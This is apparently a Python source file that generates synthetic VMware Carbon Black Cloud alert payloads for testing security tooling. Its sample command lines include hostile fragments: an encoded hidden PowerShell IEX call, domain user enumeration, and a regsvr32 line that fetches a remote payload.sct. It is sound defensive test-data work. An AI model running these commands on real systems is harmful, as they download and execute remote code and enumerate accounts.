"""VMware Carbon Black — Cloud Alert webhook payload format.

Real Carbon Black Cloud sends alerts via SIEM connector or webhook notifications.
Format: https://developer.carbonblack.com/reference/carbon-black-cloud/platform/latest/alerts-api/
"""
import random
from backend.generators.base import BaseGenerator


class CarbonBlackGenerator(BaseGenerator):
    product_name = "VMware Carbon Black Cloud"
    product_category = "edr"

    ALERT_TYPES = ["WATCHLIST", "CB_ANALYTICS", "DEVICE_CONTROL", "CONTAINER_RUNTIME"]

    REASON_CODES = [
        "A known malware hash was detected",
        "Process executed from suspicious directory",
        "Anomalous script interpreter usage",
        "Unauthorized USB device connected",
        "Network connection to known C2 server",
        "Living-off-the-land binary abuse detected",
        "Credential access tool identified",
        "Process injection into trusted process",
        "Ransomware file encryption behavior",
        "Suspicious scheduled task creation",
    ]

    PROCESS_NAMES = [
        "powershell.exe", "cmd.exe", "rundll32.exe", "regsvr32.exe",
        "mshta.exe", "certutil.exe", "wscript.exe", "cscript.exe",
        "schtasks.exe", "bitsadmin.exe", "msiexec.exe", "python.exe",
    ]

    PROCESS_PATHS = {
        "powershell.exe": "c:\\windows\\system32\\windowspowershell\\v1.0\\",
        "cmd.exe": "c:\\windows\\system32\\",
        "rundll32.exe": "c:\\windows\\system32\\",
        "regsvr32.exe": "c:\\windows\\system32\\",
        "mshta.exe": "c:\\windows\\system32\\",
        "certutil.exe": "c:\\windows\\system32\\",
        "wscript.exe": "c:\\windows\\system32\\",
        "cscript.exe": "c:\\windows\\system32\\",
        "schtasks.exe": "c:\\windows\\system32\\",
        "bitsadmin.exe": "c:\\windows\\system32\\",
        "msiexec.exe": "c:\\windows\\system32\\",
        "python.exe": "c:\\users\\{user}\\appdata\\local\\programs\\python\\python311\\",
    }

    WORKFLOW_STATES = ["OPEN", "OPEN", "OPEN", "IN_PROGRESS", "CLOSED"]
    DEVICE_OS = ["WINDOWS", "WINDOWS", "WINDOWS", "LINUX", "MAC"]

    SEVERITY_MAP = {"critical": 10, "high": 8, "medium": 5, "low": 3}

    THREAT_CATEGORIES = [
        "NON_MALWARE", "NEW_MALWARE", "KNOWN_MALWARE", "RISKY_PROGRAM", "PUP",
    ]

    def generate(self) -> dict:
        severity = self._pick_severity()
        technique_id, technique_name = self._pick_technique()
        host = self._pick_host()
        user = self._pick_user()
        ip = self._pick_ip()
        process = random.choice(self.PROCESS_NAMES)
        process_path = self.PROCESS_PATHS.get(process, "c:\\windows\\system32\\").format(user=user)
        alert_type = random.choice(self.ALERT_TYPES)
        device_id = random.randint(100000, 999999)

        indicators = [
            {
                "indicator_id": self._uuid(),
                "type": random.choice(["SHA256", "PROCESS_NAME", "IP_ADDRESS"]),
                "value": random.choice([self._pick_hash(), process, ip]),
                "match_type": random.choice(["equality", "regex"]),
            }
            for _ in range(random.randint(1, 3))
        ]

        return {
            "id": self._uuid(),
            "org_key": f"{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))}",
            "type": alert_type,
            "severity": self.SEVERITY_MAP[severity],
            "reason": random.choice(self.REASON_CODES),
            "reason_code": f"R_{random.choice(['MALWARE', 'POLICY', 'ANALYTICS', 'WATCHLIST'])}",
            "threat_id": self._uuid(),
            "threat_category": random.choice(self.THREAT_CATEGORIES),
            "workflow": {
                "state": random.choice(self.WORKFLOW_STATES),
                "remediation": random.choice(["NO_REASON", "RESOLVED", "RESOLVED_BENIGN_KNOWN_GOOD"]),
                "changed_by": "SYSTEM",
                "last_update_time": self._now_iso(),
            },
            "device_id": device_id,
            "device_name": host,
            "device_os": random.choice(self.DEVICE_OS),
            "device_os_version": random.choice(["10.0.19045", "10.0.22631", "22.04", "14.3"]),
            "device_external_ip": ip,
            "device_internal_ip": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            "device_username": f"CORP\\{user}",
            "process_name": process,
            "process_path": f"{process_path}{process}",
            "process_pid": random.randint(1000, 65000),
            "process_sha256": "".join(random.choices("0123456789abcdef", k=64)),
            "process_cmdline": random.choice([
                f"{process} -enc SQBFAFgA",
                f"{process} /c net user /domain",
                f"{process} -nop -w hidden -c IEX",
                f"{process} /s /i:http://{self._pick_domain()}/payload.sct scrobj.dll",
            ]),
            "parent_name": random.choice(["explorer.exe", "svchost.exe", "services.exe", "winlogon.exe"]),
            "threat_indicators": indicators,
            "ioc_hit": f"{technique_id}:{technique_name}",
            "backend_timestamp": self._now_iso(),
            "first_event_timestamp": self._now_iso(),
            "tags": [technique_id, alert_type.lower()],
        }
